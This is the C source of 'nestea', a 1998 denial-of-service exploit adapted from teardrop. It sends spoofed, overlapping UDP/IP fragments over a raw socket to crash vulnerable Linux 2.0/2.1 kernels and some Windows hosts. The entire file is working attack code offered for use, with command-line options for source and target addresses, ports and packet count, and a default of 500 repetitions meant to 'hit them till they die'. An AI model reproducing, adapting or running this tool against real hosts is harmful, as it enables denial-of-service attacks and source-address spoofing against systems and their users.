/* 01. nestea.c - exploits the "off by one ip header" bug in Linux */

/*
 * nestea.c by humble of rhino9 4/16/98
 * This exploits the "off by one ip header" bug in the linux ip frag code.
 * Crashes linux 2.0.* and 2.1.*  and some windows boxes
 * this code is a total rip of teardrop - it's messy
 * hi sygma
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

// bsd usage is currently broken because of socket options on the third sendto

#ifdef STRANGE_BSD_BYTE_ORDERING_THING
                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
#define FIX(n)  (n)
#else                   /* OpenBSD 2.1, all Linux */
#define FIX(n)  htons(n)
#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

#define IP_MF   0x2000  /* More IP fragment en route */
#define IPH     0x14    /* IP header size */
#define UDPH    0x8     /* UDP header size */
#define MAGIC2  108
#define PADDING 256    /* datagram frame padding for first packet */
#define COUNT   500    /* we are overwriting a small number of bytes we 
			shouldnt have access to in the kernel. 
			to be safe, we should hit them till they die :>  */

void usage(u_char *);
u_long name_resolve(u_char *);
u_short in_cksum(u_short *, int);
void send_frags(int, u_long, u_long, u_short, u_short);

int main(int argc, char **argv)
{
    int one = 1, count = 0, i, rip_sock;
    u_long  src_ip = 0, dst_ip = 0;
    u_short src_prt = 0, dst_prt = 0;
    struct in_addr addr;


    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
        perror("raw socket");
        exit(1);
    }
    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
        < 0)
    {
        perror("IP_HDRINCL");
        exit(1);
    }
    if (argc < 3) usage(argv[0]);
    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
    {
        fprintf(stderr, "What the hell kind of IP address is that?\n");
        exit(1);
    }

    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
    {
        switch (i)
        {
            case 's':               /* source port (should be emphemeral) */
                src_prt = (u_short)atoi(optarg);
                break;
            case 't':               /* dest port (DNS, anyone?) */
                dst_prt = (u_short)atoi(optarg);
                break;
            case 'n':               /* number to send */
                count   = atoi(optarg);
                break;
            default :
                usage(argv[0]);
                break;              /* NOTREACHED */
        }
    }
    srandom((unsigned)(time((time_t)0)));
    if (!src_prt) src_prt = (random() % 0xffff);
    if (!dst_prt) dst_prt = (random() % 0xffff);
    if (!count)   count   = COUNT;

    fprintf(stderr, "Nestea by humble\nCode ripped from teardrop by route / daemon9\n");
    fprintf(stderr, "Death on flaxen wings (yet again):\n");
    addr.s_addr = src_ip;
    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
    addr.s_addr = dst_ip;
    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
    fprintf(stderr, " Amt: %5d\n", count);
    fprintf(stderr, "[ ");

    for (i = 0; i < count; i++)
    {
        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
        fprintf(stderr, "b00m ");
        usleep(500);
    }
    fprintf(stderr, "]\n");
    return (0);
}

void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                u_short dst_prt)
{
int i;
    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
    u_char byte;                            /* a byte */
    struct sockaddr_in sin;                 /* socket protocol structure */

    sin.sin_family      = AF_INET;
    sin.sin_port        = src_prt;
    sin.sin_addr.s_addr = dst_ip;

    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + 10);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

    byte = 0x45;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) = FIX(6);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 4;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + MAGIC2);   /* UDP total length */

    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }

    p_ptr  = packet;
    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
    byte = 0x4F;                        /* IP version and header length */
    memcpy(p_ptr, &byte, sizeof(u_char));
    p_ptr += 2;                         /* IP TOS (skipped) */
    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);    /* total length */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(242);   /* IP id */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0 | FIX(IP_MF);  /* IP frag flags and offset */
    p_ptr += 2;
    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
    byte = IPPROTO_UDP;
    memcpy(p_ptr + 1, &byte, sizeof(u_char));
    p_ptr += 4;                         /* IP checksum filled in by kernel */
    *((u_long *)p_ptr) = src_ip;        /* IP source address */
    p_ptr += 4;
    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
    p_ptr += 44;
    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
    p_ptr += 2;
    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */

	for(i=0;i<PADDING;i++)
	{
		p_ptr[i++]=random()%255;
	}	

    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                sizeof(struct sockaddr)) == -1)
    {
        perror("\nsendto");
        free(packet);
        exit(1);
    }
    free(packet);
}

u_long name_resolve(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;

    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}

void usage(u_char *name)
{
    fprintf(stderr,
            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
            name);
    exit(0);
}
